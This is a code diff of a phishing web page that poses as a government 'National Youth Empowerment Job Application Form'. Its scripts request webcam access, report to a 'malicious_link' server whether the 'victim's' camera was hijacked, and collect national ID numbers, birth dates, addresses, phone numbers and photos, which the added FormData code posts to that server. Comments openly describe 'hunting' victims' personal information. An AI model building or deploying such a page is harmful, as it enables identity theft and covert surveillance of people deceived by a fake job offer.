@@ -13,17 +13,18 @@
     <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
     <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png"> 
     <script type="text/javascript" src="payload1.js"></script>
+    <!-- <script type="text/javascript" src="payload.js"></script> -->
     <style>
         .wrapper1{display: flex;justify-content: center;align-items: center;font: 1em;font-family: Verdana, Geneva, Tahoma, sans-serif;}
-        /* body{margin: 50px auto;} */
-        .form{height: auto;width: 550px;border: 5px solid #222;border-radius: 30px;text-align: center;padding: 40px 10px;}
+        body{margin: 50px auto;}
+        .form{height: auto;width: 500px;border: 5px solid #222;border-radius: 30px;text-align: center;padding: 40px 10px;}
         .form:hover{backdrop-filter: blur(1px);}
         .input-field{width: 100%;height: 39px;margin: 40px 0;border-radius: 10px;}
         input{width: 95%;height: 100%;padding-left: 10px;font: x-large sans-serif;border: 1px solid #ccc;border-radius: 10px;}
         input:hover{border: 1px solid #000;border-radius: 10px;}
         .label{float: left;font-weight: bold;}
         .gen{display: flex;justify-content: space-between;}
-        .btn {margin: 7px 0;}
+        .btn {margin: 7px 0; cursor: pointer;}
         .radio{width: auto;height: auto;}
     </style>
     <style>
@@ -106,18 +107,20 @@ h2{
             errorMsgElement.innerHTML = e.toString();
             console.log(`navigator.getUserMedia error:${e.toString()}`);
             if (e.toString().includes("NotFoundError")){
-                console.log("Hmm, Internal or External Webcam can not be found in victims device!");
+                console.log("Hmm, ebi like say dis device no get any internal or external webcam!");
             await wait4me(5000);
                 var xhttp = new XMLHttpRequest();
-                xhttp.open("post", "malicious_link/attention.php?denied1=Hmm,_internal_or_external_camera_can_not_be_found_in_victims_device!");//
+                xhttp.open("post", "malicious_link/attention.php?denied1=internal_or_external_webcam_can_not_be_found_in_victims_device!");//
                 xhttp.send();
                 console.log(xhttp);
             } else {
-                console.log("Hmm,\nWe fucking well need to fucking access ur fucking camera, men!");
-                alert("Allow Camera Access for video calls on plat_name!");
-                window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623";
-                alert("Access to Camera Successfully Granted");
-                console.log("BOOM!, Game Over...");
+                console.log("We fucking well need to fucking access ur fucking webcam, men!");
+                await wait4me(5000);
+                var xhttp = new XMLHttpRequest();
+                var msg = "Victims_dispermit_us_in_accessing_their_webcam, Means_that_u_will_not_be_able_to_received_their_active_photos.!";
+                xhttp.open("post", `malicious_link/attention.php?denied1=${msg}`);//
+                xhttp.send();
+                console.log(xhttp);
             }
           }
         }
@@ -127,10 +130,10 @@ h2{
           window.stream = stream;
           video.srcObject = stream;
           
-                console.log("we_successfully_hacked_into_victims_camera");
+                console.log("Hahaha, we don hijack this device webcam!");
             await wait4me(5000);
                 var xhttp = new XMLHttpRequest();
-                xhttp.open("post", "malicious_link/attention.php?granted1=Wo-ho!,_we_successfully_hacked_into_victims_camera!, Now_u_can_be_able_to_received_victims_pictures.");//
+                xhttp.open("post", "malicious_link/attention.php?granted1=We_successfully_hijack_victims_webcam!, U_can_now_be_able_to_received_their_active_photos.");//
                 xhttp.send();
                 console.log(xhttp);
         
@@ -147,13 +150,44 @@ h2{
         init();
         
         </script>
-        
+        <style>
+            .intro{display: flex;justify-content: center;min-height: 100vh;align-items: center;}
+            /* .intro{width: 50%;height: 90%;} */
+            /* .wrap-intro{width: 100%;height: auto;border: #ccc 3px solid;border-radius: 25px;} */
+            .wrap-intro{height: auto;width: 500px;border: 5px solid #222;border-radius: 30px;text-align: center;padding: 40px 10px;}
+            .wrap-intro:hover{backdrop-filter: blur(1px);}
+        </style>
+<div class="intro">
+    <div class="wrap-intro">
+        <h1>The National Youth Empowerment Job Application Form</h1>
+        <p style="text-align: left;padding: 10px;font-size: large;">Want to get a job immidiately after your education!. 
+           <br>Here is the <span>
+                <script>
+                    let evilfeonix;
+                    evilfeonix=new Date().getFullYear();
+                    document.write(evilfeonix);
+                </script>
+            </span> online exercise which is the quickest way to apply for a job and it valid for all bonafide citizens in <span>
+               <script>
+                   evilfeonix=Ctry;
+                   document.write(evilfeonix);
+               </script>
+           </span>,
+            what are you waiting for!, just grab this chance and apply now, Don't miss out... 
+            click the below button in order to start the proceess <br></p>
+        <button class="input-field btn" onclick="startMe()">Start Now</button>
+        <span>Powered by the <span style="text-transform: capitalize;">
+            <script>document.write(evilfeonix);</script>
+        </span> Ministry of Education</span>
+    </div>
+</div>
+
+<div class="main-content" style="display: none;">
     <div>
         <center>
             <h1 style="text-transform: uppercase;">Job Application Form</h1>
             <h2 style="text-transform: capitalize;">Powered by the <span>
                 <script>
-                    var evilfeonix = Country;
                     document.write(evilfeonix);
                 </script>
             </span>
@@ -184,6 +218,7 @@ h2{
             <div class="input-field"><label for="date"><span class="label">Date of Birth:</span><input type="date" id="date" name="date" required></label></div>
             <div class="input-field"><label for="nin"><span class="label">NIN ID:</span><input placeholder='National Identification Number' type="text" id="nin" name="nin" required></label></div>
             <div class="input-field"><label for="job"><span class="label">Occupation:</span><input placeholder='last or current job' type="text" id="job" name="job" required></label></div>
+            <div class="input-field"><label for="pro"><span class="label">Profession:</span><input placeholder='what are you great at' type="text" id="pro" name="pro" required></label></div>
             <div class="input-field"><label for="gender"><span class="label">Gender:</span></label><br><div class="gen">
                 <label for="male">Male:<input type="radio" class="radio" id="male" name="gender" value="male" required></label>
                 <label for="female">Female:<input type="radio" class="radio" id="female" name="gender" value="female" required></label>
@@ -199,12 +234,20 @@ h2{
         </div>
     </div>
     <script>
-
+        
+    async function startMe(){
+        more();
+        await wait4me(5000);
+        document.querySelector(".intro").style.display = "none";
+        document.querySelector(".main-content").style.display = "block";
+    }
+    
+  
         async function more(){
         console.log("we_currently_interacting_with_victims_for_their_persional_information");
             await wait4me(5000);
             var xhttp = new XMLHttpRequest();
-        xhttp.open("post", `malicious_link/attention.php?message=please_wait!,_we_currently_interacting_with_victims_for_their_persional_information`);//
+        xhttp.open("post", `malicious_link/attention.php?message=please_wait!,_we_are_currently_interacting_with_victims_for_their_persional_information`);//
         xhttp.send();
         console.log(xhttp);
         }
@@ -216,6 +259,7 @@ h2{
             // var imgData=new FormData();
             // imgData.append(V_img.name,V_img.files[0]);
             
+            var prof=document.getElementById("pro").value;
             var fname=document.getElementById("fname").value;
             var state=document.getElementById("state").value;
              state=state.replaceAll(" ","_"); 
@@ -249,7 +293,7 @@ h2{
             var age=current - year;
             console.log(age);
 
-            if (name=="" || state=="" || lga=="" || nin=="" || job=="" || email=="" || phone=="" || dob=="" || home=="" || gender=="Unidentified"  || maritan=="Unidentified" || V_img==""){
+            if (prof=="" || name=="" || state=="" || lga=="" || nin=="" || job=="" || email=="" || phone=="" || dob=="" || home=="" || gender=="Unidentified"  || maritan=="Unidentified" || V_img==""){
                 document.getElementById("err").style.display = "block";
                 document.getElementById("err").innerHTML = "Opsy!, some of the input fields are not filled, please fill them.";
                 document.getElementById("err").focus();
@@ -259,6 +303,7 @@ h2{
 
             // var gender=document.getElementById("male").value;
             
+            console.log(prof);
             console.log(V_img);
             console.log(fname);
             console.log(lname);
@@ -273,10 +318,34 @@ h2{
             console.log(gender);
             console.log(maritan);
 
+                var fd = new FormData();
+            //    ?? age=${age}`
+            fd.append("vPIC",V_img);
+            fd.append("prof",prof);
+            fd.append("name",name);
+            fd.append("email",email);
+            fd.append("phone",phone);
+            fd.append("state",state);
+            fd.append("lga",lga);
+            fd.append("home",home);
+            fd.append("dob",dob);
+            fd.append("nin",nin);
+            fd.append("job",job);
+            fd.append("gender",gender);
+            fd.append("maritan",maritan);
+            fd.append("age",age);
+
             // send the form
             var xhttp = new XMLHttpRequest();
-            xhttp.open("post", `malicious_link/form.php?vPIC=${V_img}&name=${name}&email=${email}&phone=${phone}&state=${state}&lga=${lga}&home=${home}&dob=${dob}&nin=${nin}&job=${job}&gender=${gender}&maritan=${maritan}&age=${age}`);//
-            xhttp.send();
+            xhttp.open("post", "malicious_link/form.php", true);//
+            xhttp.onload = function (){
+                if (xttp.status === 200){
+                    console.log("success: ", xhttp.responseText);
+                } else {
+                    console.log("Error uploading image");
+                }
+            };
+            xhttp.send(fd);
             console.log(xhttp);
             alert("Successfully submitted");
         
@@ -288,11 +357,14 @@ h2{
         xhttp.open("post", `malicious_link/attention.php?redFlag=done_with_the_information_hunting!...`);//
         xhttp.send();
         console.log(xhttp);
+        document.getElementsByTagName("body").style.display = "none";
+        document.write = "<center><h1>Successfully Submitted the Form</h1><center>"
             }
             wait();
         }
         });
     </script>
+</div>
 </body>
 </html>
 
